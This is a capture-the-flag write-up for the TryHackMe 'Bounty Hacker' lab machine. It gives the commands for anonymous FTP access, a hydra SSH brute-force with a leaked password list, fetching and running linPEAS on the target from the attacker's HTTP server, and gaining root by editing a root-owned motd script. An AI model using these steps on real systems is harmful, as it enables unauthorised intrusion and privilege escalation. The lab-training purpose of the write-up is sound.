---
title: Bounty Hacker
date: 2020-08-05
tags: ['TryHackMe', 'Writeup', 'Cybersecurity', 'Linux']
---

<div style="text-align:center">
    <img src="/images/bounty-hacker-writeup/cover.webp" />
</div>

## Description:

 You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

Disclaimer: This writeup is for a room located on TryHackMe. If you would like to attempt the room, please visit it [here](https://tryhackme.com/room/cowboyhacker).

## Task 1

Deploy the machine by clicking the Deploy button.

## Task 2

After the machine has finished booting up, run the following command to reveal the open ports on the network (If using personal Linux machine, remember to use OpenVPN):

```bash
nmap -sV -sC -Pn
```

After nmap is finished scanning, our output shows three open ports:

21 | ftp
22 | ssh
80 | http

## Task 3

Hint: Have you visited ftp?

Thanks to this hint, we know to use the ftp server that we found in the nmap scan. So for this to work, we need to use the following command:

```bash
ftp <Machine_IP>
```

To log into the ftp server, we will be using the anonymous username to access the ftp server. This was mentioned in the nmap scan.

After searching around the ftp, we find a file within the dir directory. We notice there's a text file called task.txt. We can view this file directly in the ftp terminal using the following command:

```bash
get task.txt -
```

We now have our username!

After finding this task.txt file, we will notice there is another file called locks.txt, and it looks like a bunch of strange passwords. Let's use the get command again to save this on our machine for a future task.

```bash
get locks.txt
```

## Task 4

Hint: What is on port 22?

This task is just looking for the service running on port 22 (Check nmap scan output).

## Task 5

Hint: Hydra may be able to help.

Since we discovered the username, we can now ssh, but where is the password?

Remember that locks.txt file we discovered earlier in the ftp? It's now time to scan the file and find the password for our user!

Since the question mentions hydra, we are going to be using this command to find any available passwords for the user:

```bash
hydra -t 4 -V -l User -P /usr/share/wordlists/locks.txt ssh://<Machine_IP>
```

Now that we've obtained the password, let's move on to finding the user.txt file for task 6!

## Task 6

To begin accessing the system, we have to ssh in with our credentials. We can use the following command to gain access:

```bash
ssh user@<Machine_IP>
```

We're in!

We can also run this within the targets terminal to see if we have root privileges:

```bash
sudo -l
```

After we run a simple command to see the available items in the directory, we see the user.txt file, which has our first flag!

Commands:

```bash
ls

cat user.txt
```

## Task 7

All that's left is to find the root.txt and complete the CTF!

The easiest way to accomplish this is by using linPEAS and a python server, so we're gonna start by getting a python server up and running with this command (Remember to do this in your root terminal, not as the user!):

```bash
sudo python3 -m http.server 80
```

Now to actually obtain the script. We need to create a directory (I called mine LinEnum), wget the actual linPEAS script from the GitHub repository, and then transfer the file over to the target machine to run the exploit.

Here are the commands I used (This can be done multiple ways):

```bash
mkdir LinEnum

cd LinEnum

wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"
```

Now we need to move back over to the users terminal, and we now have it saved on our server, so let's move it over to the target machine (Remember to use this command in the target's terminal).

Note: If using the THM cloud Kali Linux machine, the Private IP is available [here](https://tryhackme.com/my-machine).

```bash
wget "http://<Private_IP>/linpeas.sh"
```

To make our linPEAS script executable, we simply do this command (Notice the color change when we run this command):

```bash
chmod +x linpeas.sh
```

Time to run the script!

```bash
./linpeas.sh
```

After a few minutes, the script should finish running on the target machine. After sifting through all the returned results, we see a file called /etc/update-motd.d/00-header (Notice how it's highlighted).

After locating this file, it's time to change the directory over to it:

```bash
cd /etc/update-motd.d

ls -la
```

This will show us that the 00-header file we found is actually owned by root.

```bash
nano 00-header
```

Now that we have the file open, let's edit the file so that the next time we log in through ssh, we will see the root.txt!

For this, we just need to add the following command at the very bottom of the open file:

```bash
cat /root/root.txt
```

ctrl + x to save the file

After completing all the above tasks, all we have to do is log out of the ssh shell and log back in. You'll see the root.txt flag is located directly in the login terminal screen!

```bash
ssh user@<Machine_IP>
```

Congratulations!

Shoutout to [Sevuhl](https://tryhackme.com/p/Sevuhl) for creating such a cool room!

## Extra

This room is based on an anime called Cowboy Bebop (One of my favorites!). You can check it out [here](https://www.imdb.com/title/tt0213338/).